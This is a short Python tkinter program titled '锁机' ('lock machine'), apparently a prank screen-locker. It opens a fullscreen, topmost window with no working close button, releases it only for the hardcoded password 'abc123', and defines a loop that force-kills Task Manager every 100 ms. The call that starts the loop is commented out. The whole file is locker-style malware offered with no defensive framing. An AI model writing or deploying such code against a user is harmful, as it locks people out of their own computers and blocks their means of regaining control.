import tkinter
import os
passwd = "abc123"


def k():
    root.after(100, k)
    os.system("taskkill /f /im Taskmgr.exe")


def v():
    if e1.get() == passwd:
        exit()
    else:
        e1.delete(0, tkinter.END)
        e1.insert(0, "密码错误！")


root = tkinter.Tk()
root.title("锁机")
root.attributes("-fullscreen", True)
root.attributes("-topmost", True)
root.protocol("WM_DELETE_WINDOW", lambda: None)
e1 = tkinter.Entry(text="密码")
b1 = tkinter.Button(root, text="退出", command=v)
e1.pack(side=tkinter.TOP)
b1.pack(side=tkinter.TOP)
# k()
root.mainloop()
